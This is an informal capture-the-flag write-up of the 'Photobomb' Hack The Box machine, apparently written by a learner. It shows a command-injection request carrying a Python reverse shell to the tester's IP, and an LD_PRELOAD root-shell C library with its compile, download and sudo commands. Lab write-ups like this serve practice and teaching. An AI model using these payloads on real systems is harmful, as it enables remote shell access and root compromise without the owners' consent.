***************************************************************************************

					Photobomb.htb

***************************************************************************************


Recon:
 	 
		nmap -A -T4 10.129.55.184

             find 2 open ports:  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
					   80/tcp open  http    nginx 1.18.0 (Ubuntu)

		  while running hidden directory scan we found a login page and photodump.js file which contains creds for loggin in

intial-foothold :
  			once loged in we can dowl photos. There is a post req to dowl the photo and we used the filetype parameter for command injection
                    "photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=png;export RHOST="10.10.16.3";export RPORT=6767;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'&dimensions=3000x2000"


Foothold :
             we get shell as wizard and while running sudo -l we found a script running as root /opt/cleanup.sh
   		    ```wizard@photobomb:/home$ sudo -l
								sudo -l
								Matching Defaults entries for wizard on photobomb:
   								 env_reset, mail_badpass,
   								 secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

								User wizard may run the following commands on photobomb:
   											 (root) SETENV: NOPASSWD: /opt/cleanup.sh```
Privillage Escalation:
 				https://book.hacktricks.xyz/linux-hardening/privilege-escalation#setenv

                       LD_PRELOAD can be invoked with sudo, let’s create a simple PE shell to exploit this 
 				#include <stdio.h>
				#include <sys/types.h>
				#include <stdlib.h>

				void _init() {
    				unsetenv("LD_PRELOAD");
    				setgid(0);
    				setuid(0);
    				system("/bin/bash");
				}   

				gcc -fPIC -shared -o pe.so pe.c -nostartfiles 
				
				upload it to our target machine wizard directory wget http://ip/pe.so
      
            		sudo LD_PRELOAD=/home/wizard/pe.so /opt/cleanup.sh
pwned!!!!

				
